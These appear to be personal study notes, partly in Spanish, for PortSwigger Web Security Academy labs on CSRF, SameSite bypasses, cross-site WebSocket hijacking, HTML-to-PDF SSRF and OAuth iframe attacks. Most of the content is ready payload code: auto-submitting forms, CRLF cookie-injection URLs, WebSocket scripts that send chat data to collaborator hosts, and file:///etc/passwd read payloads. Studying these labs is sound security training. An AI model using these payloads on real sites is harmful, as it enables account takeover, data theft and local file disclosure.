- **Strict 🔒 → Solo dentro del mismo sitio. Más seguro, pero puede romper algunas funcionalidades.**
- **Lax 🌐 → Permite cookies en enlaces, pero bloquea en formularios y scripts para evitar ataques CSRF.**

---

Basic CSRF:
Capture request to change email
Right click > engagement tools > generate CSRF POC

- Debes copiar la estructura del formulario de la pagina para luego alterarlo:
```html
<form class="login-form" name="change-email-form" action="https://0a0d006f034c4fab80268ac600780089.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@hacked.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

```html
<form class="login-form" name="change-email-form" action="https://0ae10087045470e480fdfded00840014.web-security-academy.net/my-account/change-email" method="GET">
    <input type="hidden" name="email" value="pwned@pwned.com">
</form>

<script>
   document.forms[0].submit();
</script>
```

[Code 3]
```html
<form class="login-form" name="change-email-form" action="https://0a68004904ce1aa980b503e000d70043.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hideen" name="email" value="sivenga@sivenga.com">
    <input required="" type="hidden" name="csrf" value="0jeiRcj0dlqjXNGfsu5ExbnXVLQxTnnj">
</form>

<script>
    document.forms[0].submit();
</script>
```

Non-Session Cookie:
- 'SameSite' es necesario cuando hay cookies entre distintas webs/sesiones.
```html
<form class="login-form" name="change-email-form" action="https://0a74009804b0964280760dfe00b400b1.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="sal@ypimienta.com">
    <input required="" type="hidden" name="csrf" value="s78IWn7egk6G78Pyz7uXqFX39l3SecPm">
</form>

<img src="https://0a74009804b0964280760dfe00b400b1.web-security-academy.net/?search=prueba%0d%0aSet-Cookie:%20csrfKey=8QPNWD5t9mVHdNdnRCJG5g6KtY8YLJpQ%3b%20SameSite=None" onerror="document.forms[0].submit();">
```

```html
<form class="login-form" name="change-email-form" action="https://0af7004c0302a40d8026807300e000d0.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@pwned.com">
    <input required="" type="hidden" name="csrf" value="test">
</form>

<img src="https://0af7004c0302a40d8026807300e000d0.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=test%3b%20SameSite=None" onerror="document.forms[0].submit();">
```

Method Override:
```html
<script>
    location="https://0a67003c04f1552b8027036100cb00f4.web-security-academy.net/my-account/change-email?email=pwned@gmail.com%40test.com&_method=POST";
</script>
```

SameSite=Strict:
- Le indica al navegador que **nunca envíe la cookie a un dominio diferente al que la creó**.
	- (al contrario de SameSite=None)
```html
<script>
    location="https://0a36009b04c472b481abe8df00970046.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email%3femail=pwned@pwned.com%26submit=1";
</script>
```


```js
<script>
    var ws = new WebSocket("https://0a6a00ba031e862d809f039a004900a7.web-security-academy.net/chat");
    
    ws.onopen = function() {
       ws.send("READY");
    };
    
    ws.onmessage = function(info) {
       fetch("https://x534dnv4y1xqms1vu6vs780jxa31r3fs.oastify.com/?data=" + info.data));
    };
</script>
```

```js
<script>
    location='https://cms-0a6a00ba031e862d809f039a004900a7.web-security-academy.net/login?username=%3Cscript%3Evar+ws+%3D+new+WebSocket%28%22https%3A%2F%2F0a6a00ba031e862d809f039a004900a7.web-security-academy.net%2Fchat%22%29%3Bws.onopen+%3D+function%28%29+%7Bws.send%28%22READY%22%29%3B%7D%3Bws.onmessage+%3D+function%28info%29+%7Bfetch%28%22https%3A%2F%2Fra5yih0y3v2krm6pz00mc25d248vwukj.oastify.com%2F%3Fdata%3D%22+%2B+btoa%28info.data%29%29%3B%7D%3B%3C%2Fscript%3E&password=pasdf'
</script>
```

SameSite=Lax con cookie refresh:
```js
<form class="login-form" name="change-email-form" action="https://0a27001203887acc80c2809400f700ae.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@pwned.com">             
</form>

<script>
    window.open("https://0a27001203887acc80c2809400f700ae.web-security-academy.net/social-login");
    setTimeout(updateEmail, 5000);
    function updateEmail(){
        document.forms[0].submit();
    }
</script>
```

'Refe(r)rer' Header:
- Si borramos esa parte de la cabecera deja de validarlo. Realmente 'referer' es solo un metodo de seguridad que nos dice de que pagina venimos previo a la redireccion de solicitud realizada
```html
<html>
<head>
    <meta name="referrer" content="no-referrer">
</head>
<form class="login-form" name="change-email-form" action="https://0adc00ba044eb0f3800c0d9100920097.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@pwned.com">
</form>

<script>
    document.forms[0].submit();
</script>
</html>
```

'Referrer' vulnerable con cabecera 'unsafe-url':
- En este lab te cogia como referrer valido que la cadena tuviera la URL valida, entonces la añadimos en file y con la cabecera 'unsafe-url' hacemos que se refleje al final
![[Pasted image 20260628121815.png]]



Checks:
- A relevant Action (Change users email)
- Cookie-based session handling: session
- No unpredicatable parameters (search url parameter allows user to set cookie)

Tests:
- Change the request method from POST to GET (Click derecho > Change Request Method)
- Remove CSRF token and see if app accepts request (tanto en GET como en POST)
- Chekear si el token es de 1 solo uso y se puede usar el de un login dropeado [Code 3]
- See if csrf token can be replaced with other valid one
- See if csrf token is tied to non-session:
```
change Session cookie -> logs you out
change csrf key -> invalid CSRF token
= not linked
Change the csrf token and key to the ones of the other account you have (optional, just to confirm) -> observer we can use them
Header Injection:
Set csrfkey GET /?search=test%0d%0aSet-Cookie:%20csrfKey=5aXHr4eRTwOpjA0WncadN9qOmsDssRcJ%3b%20SameSite=None

adjust CSRF payload,change script for including you csrf token, adn key in the header injection:
<img src="https://0a93006d03b753f881a0263f004c004e.web-security-academy.net/?search=%0d%0aSet-Cookie:%20csrfKey=5aXHr4eRTwOpjA0WncadN9qOmsDssRcJ%3b%20SameSite=None" onerror="document.forms[0].submit()">

```

- See if token is duplicated in cookie (again header injection + csrf to set the cookie as the csrf token)
- If Refearer header is blocking:
	- try removing it including:`<meta name="referrer" content="no-referrer">`
	- try appending the valid referer as param (http://evil?trusted.com...):
		Include: `Referrer-Policy: unsafe-url` on the exploit server HEAD
		and add on history.pushState: `history.pushState("", "", "/?0a8b008a04164f71818339a700860008.web-security-academy.net")`
- Check SameSite restrictions
```
SameSite=Lax (Default):
-> Method overwrite
	-> ?email=putadon%40puta.com&_method=POSTbypass)
-> Cookie Refresh (OauthFlow refreshes cookie)
	-> CSRF POC +
    <script>
      window.open('https://0a60001d03b15848815a118a005f003e.web-security-academy.net/social-login');
      setTimeout(changeEmail, 5000);
      function changeEmail(){
            document.forms[0].submit();
      };
    </script>


SameSite=Strict in /login defined:
-> Redirection
	-> /post/comment/confirmation?postId=1/../../my-account/change-email?email=testosterona%40test.com&submit=1
	Change script in CSRF POC (urlencode &) 
	<script>
    document.location = "https://0af2006f049bd0da80cf8fb100a500ed.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned2%40web-security-academy.net%26submit=1";
</script>
```

- CWSH SameSite=Strict:
```
With XSS on a allowed subdomain (found in JS Access-Control-Allow-Origin: https://cms-0a7c0019032ef6f280b02152006100d7.web-security-academy.net):
<script>
document.location=https://cms-0a7c0019032ef6f280b02152006100d7.web-security-academy.net/login?username=URLENCODED-CWSH&password=anyting";
</script>

```

---

### CSRF Is Logged In `POST /refreshPassword`

> If cookie with the **isloggedin** name is _**identified**_, then a refresh of admin password POST request could be exploited. Change username parameter to administrator while logged in as low privilege user, CSRF where token is not tied to user session.

```html
POST /refreshpassword HTTP/1.1
Host: TARGET.net
Cookie: session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--MCwCFAI9forAezNBAK%2fWxko91dgAiQd1AhQMZgWruKy%2fs0DZ0XW0wkyATeU7aA%3d%3d
Content-Length: 60
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://TARGET.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
X-Forwarded-Host: EXPLOIT.net
X-Host: EXPLOIT.net
X-Forwarded-Server: EXPLOIT.net
Referer: https://TARGET.net/refreshpassword
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

csrf=TOKEN&username=administrator
```

![[Pasted image 20250219161347.png]]


### HTML to PDF

> **Identify** a PDF download function and the `source code` uses `JSON.stringify` to create html on download. This HTML-to-PDF framework is vulnerable to SSRF attack. Partial `source code` for JavaScript on the target `downloadReport.js`.

```js
function downloadReport(event, path, param) {

body: JSON.stringify({
  [param]: html
  }
  )
  
```

> **Note:** The `<div>` tag defines a division or a section in an HTML document. The
> 
> tag is used as a container for HTML elements - which is then styled with CSS. [z3nsh3ll explain HTML DIV demarcation and SPAN different ways to style the elements.](https://youtu.be/5djtMMciBlw)

```html
<div><p>Report Heading by <img src="https://OASTIFY.COM/test.png"></p>
```

> Identify file download HTML-to-PDF convert function on target is vulnerable.

```js
<script>
	document.write('<iframe src=file:///etc/passwd></iframe>');
</script>
```

> Libraries used to convert HTML files to PDF documents are vulnerable to server-side request forgery (SSRF).

[PortSwigger Research SSRF](https://portswigger.net/daily-swig/ssrf)

> Sample code below can be injected on vulnerable implementation of HTML to PDF converter such as `wkhtmltopdf` to read local file, resulting in [SSRF to Local File Read Exploit in Hassan's blog](http://hassankhanyusufzai.com/SSRF-to-LFI/).

> Thehackerish showing wkHTMLtoPDF exploitation using [root-me.org - Gemini-Pentest-v1](https://www.root-me.org/) CTF lab in the video [Pentest SSRF Ep4](https://youtu.be/Prqt3N5QU2Q?t=345) by editing the name of the admin profile with HTML content it is then generated server side by including remote or local files.

![[Pasted image 20250219163530.png]]

```html
<html>
 <body>
  <script>
   x = new XMLHttpRequest;
   x.onload = function() {
    document.write(this.responseText)
   };
   x.open("GET", "file:///home/carlos/secret");
   x.send();
  </script>
 </body>
</html>
```

> JSON POST request body containing the HTMLtoPDF formatted payload to read local file.

```json
{
 "tableHtml":"<div><p>SSRF in HTMLtoPDF</p><iframe src='file:///home/carlos/secret' height='500' width='500'>"
}
```

![[Pasted image 20250219163715.png]]

> Above the display name is injected with `HTML` payload and on export the HTML-to-PDF converter perform SSRF.

> The PDF creator: wkhtmltopdf 0.12.5 is known for SSRF vulnerabilities, and in [HackTricks - Server Side XSS - Dynamic PDF](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf) there is cross site scripting and server side exploits documented.

### OAuth - IFRAME CSRF

> oAuth linking exploit server hosting iframe, then deliver to victim, forcing user to update code linked.

[![csrf](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/csrf.png)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf.png)

> Intercepted the GET /oauth-linking?code=[...]. send to repeat to save code. **Drop** the request. Important to ensure that the code is not used and, remains valid. Save on exploit server an iframe in which the `src` attribute points to the URL you just copied.

```html
<iframe src="https://TARGET.net/oauth-linking?code=STOLEN-CODE"></iframe>
```

